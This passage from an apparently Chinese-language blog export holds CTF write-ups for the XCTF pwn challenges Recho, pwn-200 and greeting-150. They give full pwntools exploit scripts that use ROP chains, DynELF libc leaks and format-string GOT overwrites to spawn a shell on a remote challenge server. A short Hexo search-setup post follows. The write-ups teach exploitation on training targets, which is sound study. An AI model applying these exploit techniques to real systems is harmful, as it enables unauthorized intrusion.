p64(printf_plt)<br>根据以上描述，构造payload如下<br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>elf=ELF(<span class="hljs-string">&#x27;./Recho&#x27;</span>)<br>p=remote(<span class="hljs-string">&#x27;220.249.52.134&#x27;</span>,<span class="hljs-string">&#x27;41714&#x27;</span>)<br>pop_rdi_ret = <span class="hljs-number">0x4008a3</span><br>pop_rax_ret = <span class="hljs-number">0x4006fc</span><br>add_rdi_ret = <span class="hljs-number">0x40070d</span><br>pop_rsi_ret = <span class="hljs-number">0x4008a1</span><br>pop_rdx_ret = <span class="hljs-number">0x4006fe</span><br>alarm_plt=elf.plt[<span class="hljs-string">&#x27;alarm&#x27;</span>]<br>read_plt=elf.plt[<span class="hljs-string">&#x27;read&#x27;</span>]<br>write_plt=elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br>printf_plt=elf.plt[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>alarm_got=elf.got[<span class="hljs-string">&#x27;alarm&#x27;</span>]<br>flag = <span class="hljs-number">0x601058</span><br>buf = <span class="hljs-number">0x601068</span><br><br><span class="hljs-comment"># 劫持alarm的got表</span><br>payload = <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x38</span><br><span class="hljs-comment"># rax = 0x5</span><br>payload += p64(pop_rax_ret) + p64(<span class="hljs-number">0x5</span>)<br><span class="hljs-comment"># rdi = alarm_got</span><br>payload+= p64(pop_rdi_ret) + p64(alarm_got)<br><span class="hljs-comment"># [rdi] = [rdi] + 0x5 </span><br>payload += p64(add_rdi_ret)<br><br><span class="hljs-comment"># 构造 fd = open(&quot;flag&quot; , 0)</span><br><span class="hljs-comment"># rax = 2</span><br>payload += p64(pop_rax_ret) + p64(<span class="hljs-number">2</span>)<br><span class="hljs-comment"># rdi = &amp;&quot;flag&quot;</span><br>payload += p64(pop_rdi_ret) + p64(flag)<br>payload+=p64(pop_rdx_ret)+p64(<span class="hljs-number">0</span>)<br><span class="hljs-comment"># rsi = 0 (r15 = 0)</span><br>payload += p64(pop_rsi_ret) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>)<br><span class="hljs-comment"># open(&quot;flag&quot; , 0)</span><br>payload += p64(alarm_plt)<br><br><span class="hljs-comment"># 构造 read(fd, buf, 100)</span><br><span class="hljs-comment"># rdi = 3 打开一个文件</span><br>payload += p64(pop_rdi_ret) + p64(<span class="hljs-number">3</span>)<br><span class="hljs-comment"># rsi = buf (r15 = 0)</span><br>payload += p64(pop_rsi_ret) + p64(buf) + p64(<span class="hljs-number">0</span>)<br><span class="hljs-comment"># rdx = 100</span><br>payload += p64(pop_rdx_ret) + p64(<span class="hljs-number">100</span>)<br><span class="hljs-comment"># read(3, buf, 100)</span><br>payload += p64(read_plt)<br><br><span class="hljs-comment">#构造 printf(buf)</span><br><span class="hljs-comment"># rdi = buf</span><br>payload += p64(pop_rdi_ret) + p64(buf)<br><span class="hljs-comment"># printf(buf)</span><br>payload += p64(printf_plt)<br><br>p.recvuntil(<span class="hljs-string">&#x27;Welcome to Recho server!\n&#x27;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">0x200</span>))<br>payload=payload.ljust(<span class="hljs-number">0x200</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)<br>p.send(payload)<br>p.recv()<br>p.shutdown(<span class="hljs-string">&#x27;send&#x27;</span>)<br>p.interactive()<br>p.close()<br><br></code></pre></td></tr></table></figure><h1 id="攻防世界-pwn-pwn-200-dynelf模块使用"><a class="markdownIt-Anchor" href="#攻防世界-pwn-pwn-200-dynelf模块使用"></a> 攻防世界-pwn-pwn-200-DynELF模块使用</h1><p>1.先检查程序保护，32位程序，发现只开启了NX保护</p><p>​          <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413221127258.png" alt="image-20210413221127258" style="zoom:67%;"></p><p>2.使用ida查看函数，主函数如下</p> <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413221142918.png" alt="image-20210413221142918" style="zoom:67%;"><p>发现在sub_8048484()函数下存在栈溢出漏洞</p> <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413221159623.png" alt="image-20210413221159623" style="zoom:67%;"><p>该题无libc，我们可以使用pwntool的DynELF模块</p><p>此题目借助DynElF模块实现有一下要点</p><p>本题是32位linux下的二进制程序，无cookie，存在很明显的栈溢出漏洞，且可以循环泄露，符合我们使用DynELF的条件。具体的栈溢出位置等调试过程就不细说了，只简要说一下借助DynELF实现利用的要点：</p><p>1）调用write函数来泄露地址信息，比较方便；</p><p>2）32位linux下可以通过布置栈空间来构造函数参数，不用找gadget，比较方便；</p><p>3）在泄露完函数地址后，需要重新调用一下_start函数，用以恢复栈；</p><p>4）在实际调用system前，需要通过三次pop操作来将栈指针指向systemAddress，可以使用ropper或ROPgadget来完成。</p><h3 id="dynelf模块介绍"><a class="markdownIt-Anchor" href="#dynelf模块介绍"></a> DynELF模块介绍</h3><p>DynELF是pwntools中专门用来应对无libc情况的漏洞利用模块，其基本代码框架如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python">p = process(<span class="hljs-string">&#x27;./xxx&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak</span>(<span class="hljs-params">address</span>):</span><br><br> <span class="hljs-comment">#各种预处理</span><br><br> payload = <span class="hljs-string">&quot;xxxxxxxx&quot;</span> + address + <span class="hljs-string">&quot;xxxxxxxx&quot;</span><br><br> p.send(payload)<br><br> <span class="hljs-comment">#各种处理</span><br><br> data = p.recv(<span class="hljs-number">4</span>)<br><br> log.debug(<span class="hljs-string">&quot;%#x =&gt; %s&quot;</span> % (address, (data **<span class="hljs-keyword">or</span>** <span class="hljs-string">&#x27;&#x27;</span>).encode(<span class="hljs-string">&#x27;hex&#x27;</span>)))<br><br> <span class="hljs-keyword">return</span> data<br><br>d = DynELF(leak, elf=ELF(<span class="hljs-string">&quot;./xxx&quot;</span>))   <span class="hljs-comment">#初始化DynELF模块</span><br><br>systemAddress = d.lookup(<span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&#x27;libc&#x27;</span>) <span class="hljs-comment">#在libc文件中搜索system函数的地址</span><br></code></pre></td></tr></table></figure><p>write函数原型是write(fd, addr, len)，即将addr作为起始地址，读取len字节的数据到文件流fd（0表示标准输入流stdin、1表示标准输出流stdout）。</p><p>借助write函数，可以实现泄露</p><p>所以我们的leak函数可以这么写</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak</span>(<span class="hljs-params">address</span>):</span><br>    payload=<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0x6c</span>+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">4</span>+p32(write_plt)+p32(vulnaddress)+p32(<span class="hljs-number">1</span>)+p32(address)+p32(<span class="hljs-number">4</span>)<br>    r.send(payload)<br>    data=r.recv(<span class="hljs-number">4</span>)<br>    <span class="hljs-built_in">print</span>(data)<br>    <span class="hljs-keyword">return</span> data<br><span class="hljs-built_in">print</span> r.recv()<br><br>dyn = DynELF(leak,elf=ELF(<span class="hljs-string">&#x27;./pwn-200&#x27;</span>))<br>sys_addr = dyn.lookup(<span class="hljs-string">&quot;system&quot;</span>,<span class="hljs-string">&#x27;libc&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;system address:&quot;</span>,<span class="hljs-built_in">hex</span>(sys_addr))<br><br></code></pre></td></tr></table></figure><p>我们还需要找到一个连续3次pop的地址，这里找到的是0x0804856c</p> <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413221514111.png" alt="image-20210413221514111" style="zoom:67%;"><p>然后我们需要一个bss段写入，这里可以用0x0804A020</p> <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413221605895.png" alt="image-20210413221605895" style="zoom:67%;"><p>准备了这些条件后，我们就可以构建payload脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>p=remote(<span class="hljs-string">&quot;220.249.52.134&quot;</span>,<span class="hljs-number">36377</span>)<br><span class="hljs-comment">#p=process(&quot;./pwn200&quot;)</span><br><span class="hljs-comment">#gdb.attach(p)</span><br>start_addr=<span class="hljs-number">0x080483d0</span><br>vulnaddress=<span class="hljs-number">0x08048484</span><br>elf=ELF(<span class="hljs-string">&quot;./pwn-200&quot;</span>)<br>write_plt=elf.symbols[<span class="hljs-string">&#x27;write&#x27;</span>]<br>read_plt=elf.symbols[<span class="hljs-string">&#x27;read&#x27;</span>]<br>bss_addr = <span class="hljs-number">0x0804a020</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak</span>(<span class="hljs-params">address</span>):</span><br>    payload=<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0x6c</span>+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">4</span>+p32(write_plt)+p32(vulnaddress)+p32(<span class="hljs-number">1</span>)+p32(address)+p32(<span class="hljs-number">4</span>)<br>    p.send(payload)<br>    data=p.recv(<span class="hljs-number">4</span>)<br>    <span class="hljs-built_in">print</span>(data)<br>    <span class="hljs-keyword">return</span> data<br><span class="hljs-built_in">print</span> p.recv()<br><br>dyn = DynELF(leak,elf=ELF(<span class="hljs-string">&#x27;./pwn-200&#x27;</span>))<br>sys_addr = dyn.lookup(<span class="hljs-string">&quot;system&quot;</span>,<span class="hljs-string">&#x27;libc&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;system address:&quot;</span>,<span class="hljs-built_in">hex</span>(sys_addr))<br><br><span class="hljs-comment">#调用_start函数，恢复栈</span><br>payload1 = <span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0x6c</span>+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">4</span><br>payload1 += p32(start_addr)<br>p.send(payload1)<br>p.recv()<br><br>ppp_addr = <span class="hljs-number">0x0804856c</span>  <span class="hljs-comment">#获取到的连续3次pop操作的gadget的地址 </span><br>payload2 = <span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0x6c</span>+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">4</span><br>payload2 += p32(read_plt)<br>payload2 += p32(ppp_addr)<br>payload2 += p32(<span class="hljs-number">0</span>)<br>payload2 += p32(bss_addr)<br>payload2 += p32(<span class="hljs-number">8</span>)<br>payload2 += p32(sys_addr) + p32(vulnaddress) + p32(bss_addr)<br><span class="hljs-comment">#在实际调用system前，需要通过三次pop操作来将栈指针指向systemAddress</span><br><span class="hljs-comment">#构造read(0,bss_addr,8)把&#x27;/bin/sh&#x27;读到bss段上，因为bss段可执行</span><br><span class="hljs-comment">#用三次pop把指针指向了systemAddress，此时调用system()函数，再栈溢出把bss段上的内容(&#x27;/bin/sh&#x27;)当作参数传给system()调用</span><br>p.send(payload2)<br>p.send(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>)<br>p.interactive()<br><br></code></pre></td></tr></table></figure><h1 id="攻防世界-pwn-greeting-150-格式化字符串覆盖got表-循环"><a class="markdownIt-Anchor" href="#攻防世界-pwn-greeting-150-格式化字符串覆盖got表-循环"></a> 攻防世界-pwn-greeting-150-格式化字符串覆盖got表-循环</h1><p>1.首先检查程序</p><p>​      <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413221809095.png" alt="image-20210413221809095" style="zoom:67%;"></p><p>32位程序，只开启了栈保护和堆栈不可执行</p><p>2.用ida查看程序中的函数</p><p>主函数如下</p> <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413221907760.png" alt="image-20210413221907760" style="zoom:67%;"><p>该程序的大致就是向v5读入64字节，读入成功后，将v5的内容输出到s里面，之后将s直接输出，这最后一个printf(&amp;s)存在一个格式化字符串漏洞，可以进行利用，进行任意地址读写</p><p>3.接下来需要测试偏移</p><p>输入</p><p>.%4x.%4x.%4x.%4x.%4x.%4x.%4x.%4x.%4x.%4x.%4x.%4x</p><p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413221928354.png" alt="image-20210413221928354"></p><p>可以看到对于该程序，输出的第43个字节是我们的”.”号的ASCII码值0x2e</p><p>但是该程序没有循环，就算是我们覆盖了got表的地址，也无法再次返回程序了，这时候我们需要用到一个可以使用格式化字符串漏洞使程序无限循环的漏洞</p><p>此漏洞原理为：写代码的时候我们以main函数作为程序入口，但是编译成程序的时候入口并不是main函数，而是start代码段。事实上，start代码段还会调用__libc_start_main来做一些初始化工作，最后调用main函数并在main函数结束后做一些处理。</p><p>具体流程如下</p> <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413221946280.png" alt="image-20210413221946280" style="zoom:67%;"><p>简单地说，在main函数前会调用.init段代码和.init_array段的函数数组中每一个函数指针。同样的，main函数结束后也会调用.fini段代码和.fini._arrary段的函数数组中的每一个函数指针。</p><p>而我们的目标就是修改.fini_array数组的第一个元素为start。需要注意的是，这个数组的内容在再次从start开始执行后又会被修改，且程序可读取的字节数有限，因此需要一次性修改两个地址并且合理调整payload。</p><p>所以当main运行第一次时，将strlen函数的got表覆写成system的plt地址，然后将.fini._arra第一个元素覆写成strat地址，进而造成循环，第二次main函数时，输入“/bin/sh\x00”，在调用strlen函数时就会变成system(&quot;/bin/sh&quot;),进而拿到shell。</p><p>经过查看，system的plt表地址为0x8048490</p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413222012210.png" alt="image-20210413222012210" style="zoom:67%;"> <p>调用的fini_got = 0x8049934</p> <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413222025348.png" alt="image-20210413222025348" style="zoom:67%;"><p>又知道这里的数据为0x80485A0,又因为main函数的地址为0x08485ED，所以我们只需要修改后2位的数据即可让调用fini的时候返回main函数</p> <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413222048628.png" alt="image-20210413222048628" style="zoom:67%;"><p>然后通过查看知道strlen的got表地址为0x8049A54</p> <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413222103549.png" alt="image-20210413222103549" style="zoom:67%;"><p>综上所述</p><p>fini_got = 0x8049934</p><p>main_addr = 0x80485ED</p><p>strlen_got = 0x8049A54</p><p>system_plt = 0x8048490</p><p>因此设置一个数组为</p><p>arr = [</p><p>0x85ED,</p><p>0x8490,0x804</p><p>]</p><p>因此，我们要在fini_got写入2字节数据arr[0]</p><p>在strlen_got写入2字节数据arr[2]，在strlen_got+2处写入2字节数据arr[1]</p><p>进而构造payload为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *  <br>p = remote(<span class="hljs-string">&#x27;220.249.52.134&#x27;</span>,<span class="hljs-number">46970</span>)   <br>fini_got = <span class="hljs-number">0x8049934</span>  <br>main_addr = <span class="hljs-number">0x80485ED</span>  <br>strlen_got = <span class="hljs-number">0x8049A54</span>  <br>system_plt = <span class="hljs-number">0x8048490</span>  <br>p.recvuntil(<span class="hljs-string">&#x27;Please tell me your name... &#x27;</span>)  <br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">2</span>  <br>payload += p32(strlen_got)  <br>payload +=  p32(strlen_got+<span class="hljs-number">2</span>)  <br>payload += p32(fini_got)  <br>arr = [  <br>   <span class="hljs-number">0x85ED</span>,  <br>   <span class="hljs-number">0x8490</span>,<span class="hljs-number">0x804</span>  <br>]  <br><span class="hljs-comment">#hn 为WORD(字),hhn为BYTE(字节),n为DWORD(双字)  </span><br><span class="hljs-comment">#修改strlen GOT内容的前2字节  </span><br>num = arr[<span class="hljs-number">2</span>] - <span class="hljs-number">32</span>  <br>payload += <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(num) + <span class="hljs-string">&#x27;c%13$hn&#x27;</span>  <br><span class="hljs-comment">#修改strlen GOT内容的后2字节  </span><br>num = arr[<span class="hljs-number">1</span>] - arr[<span class="hljs-number">2</span>]  <br>payload += <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(num) + <span class="hljs-string">&#x27;c%12$hn&#x27;</span>  <br><span class="hljs-comment">#修改fini的后2字节  </span><br>num = arr[<span class="hljs-number">0</span>] - arr[<span class="hljs-number">1</span>]  <br>payload += <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(num) + <span class="hljs-string">&#x27;c%14$hn&#x27;</span>  <br><span class="hljs-built_in">print</span> <span class="hljs-built_in">len</span>(payload)  <br>p.sendline(payload)  <br><span class="hljs-comment">#get shell   </span><br>p.recvuntil(<span class="hljs-string">&#x27;Please tell me your name... &#x27;</span>)   <br>p.sendline(<span class="hljs-string">&#x27;cat flag&#x27;</span>)   <br>p.interactive()  <br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>PWN学习</category>
      
      <category>学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PWN学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hexo启用搜索功能(图片测试)</title>
    <link href="/2020/09/25/phtest/"/>
    <url>/2020/09/25/phtest/</url>
    
    <content type="html"><![CDATA[<h1 id="hexo启用搜索功能"><a class="markdownIt-Anchor" href="#hexo启用搜索功能"></a> Hexo启用搜索功能</h1><p>1.首先在Hexo的根目录下执行以下命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install hexo-generator-searchdb --save <br></code></pre></td></tr></table></figure><p><img src="/2020/09/25/phtest/image-20210325172142569.png" alt="image-20210325172142569"></p><p>有WARN没关系，最后还是可以用的</p><p>2.在全局配置文件_config.yml，新增如下内容</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yml"><span class="hljs-attr">search:</span><br>  <span class="hljs-attr">path:</span> <span class="hljs-string">search.xml</span><br>  <span class="hljs-attr">field:</span> <span class="hljs-string">post</span><br>  <span class="hljs-attr">format:</span> <span class="hljs-string">html</span><br>  <span class="hljs-attr">limit:</span> <span class="hljs-number">10000</span><br></code></pre></td></tr></table></figure><p>3.在主题配置文件_config.yml修改local_search为true</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">local_search:<br>    <span class="hljs-built_in">enable</span>: <span class="hljs-literal">true</span>```<br></code></pre></td></tr></table></figure><p>4.新建一个页面，命名为 search 。命令如下：</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haxe">hexo <span class="hljs-keyword">new</span> <span class="hljs-type">page</span> search<br></code></pre></td></tr></table></figure><p>5.编辑刚新建的页面，将页面的类型设置为 search</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">title</span>: search<br><span class="hljs-attribute">date</span>: <span class="hljs-number">2021</span>-<span class="hljs-number">03</span>-<span class="hljs-number">25</span> <span class="hljs-number">17</span>:<span class="hljs-number">09</span>:<span class="hljs-number">15</span><br><span class="hljs-attribute">type</span>: <span class="hljs-string">&quot;search&quot;</span><br></code></pre></td></tr></table></figure><p>6.执行hexo g和hexo d部署完成</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
